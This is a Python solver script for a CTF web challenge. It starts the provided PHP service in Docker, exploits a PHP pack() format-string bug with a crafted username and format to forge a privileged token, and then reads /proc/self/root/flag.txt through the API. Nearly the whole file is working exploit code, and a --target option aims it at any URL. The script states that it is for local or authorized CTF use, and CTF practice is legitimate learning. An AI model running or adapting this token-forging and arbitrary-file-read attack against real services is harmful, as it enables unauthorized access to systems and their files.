#!/usr/bin/env python3
"""Replay NUS Welcome CTF Private Hidden Paths against a local service.

This helper is for local or explicitly authorized CTF challenge artifacts. By
default it builds and runs the provided PHP challenge service in Docker, then
uses the `pack("i$p", ...)` format-string bug to mint a pro token and read the
challenge flag through `/proc/self/root/flag.txt`.
"""

from __future__ import annotations

import argparse
import json
import re
import shutil
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path


FLAG_RE = re.compile(r"(?i)(?:grey|flag|ctf)\{[^{}\r\n]{3,200}\}")
PACK_USERNAME = b"\x37\x13\x00\x00abcde"
PACK_FORMAT = "XXXXa*"


def build_registration_query() -> str:
    user = urllib.parse.quote_from_bytes(PACK_USERNAME)
    pack_format = urllib.parse.quote(PACK_FORMAT, safe="")
    return f"a=r&p={pack_format}&u={user}"


def build_flag_path() -> str:
    return "c/self/root/flag.txt"


def extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        candidate = match.group(0)
        if candidate not in flags:
            flags.append(candidate)
    return flags


def exploit_target(base_url: str, timeout: float = 10.0) -> str:
    base = base_url.rstrip("/")
    token = http_get(f"{base}/api.php?{build_registration_query()}", timeout=timeout).strip()
    flag_path = urllib.parse.quote(build_flag_path(), safe="/")
    flag_url = f"{base}/api.php?a=g&p={flag_path}&t={urllib.parse.quote(token, safe='')}"
    response = http_get(flag_url, timeout=timeout)
    flags = extract_flags(response)
    if not flags:
        raise RuntimeError(f"no flag found in response: {response[:200]!r}")
    print(f"token_prefix: {token[:16]}")
    print("method: PHP pack format-string rewind to pro token, then /proc/self/root flag read")
    print(f"path: /pro{build_flag_path()}")
    print(f"flag: {flags[0]}")
    return flags[0]


def http_get(url: str, timeout: float = 10.0) -> str:
    request = urllib.request.Request(url, headers={"User-Agent": "ForgeFlag-CTF-Replay/1.0"})
    with urllib.request.urlopen(request, timeout=timeout) as response:
        return response.read().decode("utf-8", errors="replace")


def solve_with_docker(service_dir: Path, timeout: float = 120.0) -> str:
    docker = shutil.which("docker")
    if not docker:
        raise RuntimeError("docker is required when --target is not provided")
    image = "forgeflag-private-hidden-paths:local"
    subprocess.run([docker, "build", "-t", image, str(service_dir)], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    container_id = ""
    try:
        run = subprocess.run(
            [
                docker,
                "run",
                "--rm",
                "-d",
                "-e",
                "SECRET_USER=pC2kltJiW2",
                "-p",
                "127.0.0.1::80",
                image,
            ],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        container_id = run.stdout.strip()
        port = _container_port(docker, container_id)
        base_url = f"http://127.0.0.1:{port}"
        _wait_for_service(base_url, timeout=min(timeout, 60.0))
        return exploit_target(base_url, timeout=10.0)
    finally:
        if container_id:
            subprocess.run([docker, "rm", "-f", container_id], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)


def _container_port(docker: str, container_id: str) -> str:
    inspect = subprocess.run(
        [docker, "inspect", container_id],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    data = json.loads(inspect.stdout)
    ports = data[0]["NetworkSettings"]["Ports"]["80/tcp"]
    if not ports:
        raise RuntimeError("container did not publish port 80")
    return str(ports[0]["HostPort"])


def _wait_for_service(base_url: str, timeout: float) -> None:
    deadline = time.monotonic() + timeout
    last_error: Exception | None = None
    while time.monotonic() < deadline:
        try:
            http_get(f"{base_url}/api.php", timeout=2.0)
            return
        except Exception as exc:  # pragma: no cover - timing dependent
            last_error = exc
            time.sleep(0.5)
    raise RuntimeError(f"service did not become ready: {last_error}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay NUS Private Hidden Paths from local CTF artifacts.")
    parser.add_argument("--service-dir", type=Path, help="path to the provided PHP service directory")
    parser.add_argument("--target", help="explicit local or authorized challenge base URL")
    parser.add_argument("--timeout", type=float, default=120.0)
    args = parser.parse_args()
    try:
        if args.target:
            exploit_target(args.target, timeout=min(args.timeout, 30.0))
        else:
            if not args.service_dir:
                parser.error("--service-dir is required unless --target is provided")
            solve_with_docker(args.service_dir.resolve(), timeout=args.timeout)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
